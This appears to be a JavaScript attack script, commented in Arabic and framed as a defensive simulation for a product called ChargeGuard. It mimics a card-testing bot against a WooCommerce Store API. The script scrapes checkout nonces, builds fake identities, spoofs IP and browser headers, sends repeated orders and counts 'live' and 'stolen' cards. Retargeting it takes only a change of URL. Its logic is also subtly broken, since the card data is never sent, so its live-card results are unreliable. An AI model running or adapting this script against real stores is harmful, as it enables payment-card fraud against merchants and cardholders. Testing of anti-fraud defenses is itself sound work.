// store-api-attack.js
// محاكاة دقيقة لهجوم Card Testing عبر WooCommerce Store API
// يحاكي سلوك البوتات الحقيقية (مثل disgrasya) بشكل كامل

const STORE_URL = 'http://localhost:8080';              // رابط المتجر الوهمي
const NUM_ATTEMPTS = 50;                               // عدد المحاولات الإجمالية
const DELAY_MS = 100;                                  // التأخير بين المحاولات (مللي ثانية)
const ATTACK_DEVICE = 'store-api-bot-device-001';      // بصمة جهاز وهمية ثابتة
const ATTACK_IP = '10.0.0.99';                         // IP وهمي ثابت

// بطاقات اختبارية (أرقام بطاقات فيزا/ماستركارد/أمريكان إكسبريس للاختبار)
// في الواقع، البوتات تستخدم آلاف البطاقات المسروقة من Dark Web
const stolenCards = [
  { number: '4111111111111111', exp: '12/28', cvv: '123' },
  { number: '5500000000000004', exp: '12/28', cvv: '456' },
  { number: '340000000000009', exp: '12/28', cvv: '789' },
  { number: '4111111111111111', exp: '11/29', cvv: '321' },
  { number: '5500000000000004', exp: '10/27', cvv: '654' },
  { number: '340000000000009', exp: '09/28', cvv: '987' },
];

// ===== دوال مساعدة =====
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// توليد بريد إلكتروني وهمي (متغير لكل محاولة)
function generateFakeIdentity(index) {
  const names = ['John', 'Jane', 'Alex', 'Sam', 'Chris', 'Pat', 'Mike', 'Sarah'];
  const domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'protonmail.com'];
  const name = names[index % names.length];
  const domain = domains[index % domains.length];
  return {
    firstName: name,
    lastName: `Tester${index}`,
    email: `${name.toLowerCase()}.tester${index}@${domain}`,
    address: `${100 + index} Main St`,
    city: 'New York',
    state: 'NY',
    zip: '10001',
    country: 'US',
  };
}

// ===== المرحلة 1: استخراج nonce من صفحة Checkout =====
async function getNonceFromCheckout() {
  console.log('[~] جاري استخراج رمز nonce من صفحة checkout...');
  const res = await fetch(`${STORE_URL}/checkout/`, {
    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
  });
  const html = await res.text();

  // البحث في HTML عن nonce
  const match = html.match(/woocommerce-process-checkout-nonce["\s]+value="([^"]+)"/);
  if (match) {
    console.log('[✓] تم استخراج nonce:', match[1].substring(0, 10) + '...');
    return match[1];
  }

  // محاولة البحث عن nonce عبر استخراج wp-config المضمن
  const inlineMatch = html.match(/wc_store_api_nonce["\s]*:\s*["']([^"']+)["']/);
  if (inlineMatch) {
    console.log('[✓] تم استخراج nonce (inline):', inlineMatch[1].substring(0, 10) + '...');
    return inlineMatch[1];
  }

  console.error('[✗] فشل استخراج nonce.');
  return null;
}

// ===== المرحلة 2: إنشاء طلب دفع مزيف عبر Store API =====
async function sendFraudulentOrder(index, nonce, card) {
  const identity = generateFakeIdentity(index);

  const payload = {
    billing_address: {
      first_name: identity.firstName,
      last_name: identity.lastName,
      email: identity.email,
      phone: '+12125551000',
      address_1: identity.address,
      city: identity.city,
      state: identity.state,
      postcode: identity.zip,
      country: identity.country,
    },
    shipping_address: {
      first_name: identity.firstName,
      last_name: identity.lastName,
      address_1: identity.address,
      city: identity.city,
      state: identity.state,
      postcode: identity.zip,
      country: identity.country,
    },
    payment_method: 'bacs', // تحويل بنكي – في الهجمات الحقيقية يستخدمون PayPal أو Stripe
    payment_data: [
      {
        key: 'bacs-account-number',
        value: '12345678',
      }
    ],
    create_account: false,
  };

  try {
    const res = await fetch(`${STORE_URL}/wp-json/wc/store/v1/checkout`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': ATTACK_IP,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Nonce': nonce,
      },
      body: JSON.stringify(payload),
    });

    const result = await res.json();

    if (res.ok) {
      // نجاح! البطاقة "حية"
      return { live: true, orderId: result.order_id, status: res.status };
    } else if (res.status === 400 || res.status === 403) {
      // فشل – البطاقة "ميتة"
      return { live: false, reason: result.message || result.error, status: res.status };
    } else {
      return { live: false, reason: `HTTP ${res.status}`, status: res.status };
    }
  } catch (err) {
    return { live: false, reason: err.message, status: 0 };
  }
}

// ===== الدالة الرئيسية =====
(async () => {
  console.log('╔══════════════════════════════════════════╗');
  console.log('║  ChargeGuard Store API Attack Simulation ║');
  console.log('╚══════════════════════════════════════════╝');
  console.log(`المتجر المستهدف: ${STORE_URL}`);
  console.log(`عدد المحاولات: ${NUM_ATTEMPTS}`);
  console.log(`بصمة الجهاز المزيفة: ${ATTACK_DEVICE}`);
  console.log(`IP مزيف: ${ATTACK_IP}\n`);

  // الخطوة 1: استخراج nonce
  const nonce = await getNonceFromCheckout();
  if (!nonce) {
    console.log('[✗] تعذر استخراج nonce. الخروج.');
    process.exit(1);
  }

  // الخطوة 2: الهجوم المُجمّع
  console.log(`[~] بدء الهجوم...\n`);
  let liveCount = 0;
  let deadCount = 0;
  let errorCount = 0;

  for (let i = 0; i < NUM_ATTEMPTS; i++) {
    const card = stolenCards[i % stolenCards.length];
    const res = await sendFraudulentOrder(i, nonce, card);

    if (res.live) {
      liveCount++;
      console.log(`[${i + 1}] ✅ بطاقة حية! (Order: ${res.orderId})`);
    } else if (res.reason) {
      deadCount++;
      if (deadCount <= 3) {
        console.log(`[${i + 1}] 🛑 فشل: ${res.reason} (HTTP ${res.status})`);
      }
    } else {
      errorCount++;
      if (errorCount <= 3) {
        console.log(`[${i + 1}] ❌ خطأ غير متوقع (HTTP ${res.status})`);
      }
    }

    await sleep(DELAY_MS);
  }

  console.log('\n📊 == ملخص الهجوم ==');
  console.log(`✅ بطاقات حية (Live): ${liveCount}`);
  console.log(`🛑 بطاقات ميتة (Dead): ${deadCount}`);
  console.log(`❌ أخطاء: ${errorCount}`);
  console.log(`\n⚠️  في الهجمات الحقيقية، البطاقات الحية تُباع لاحقًا بأسعار أعلى.`);
  console.log('→ هذا الاختبار يثبت ضرورة وجود حماية على مستوى Store API.');
})();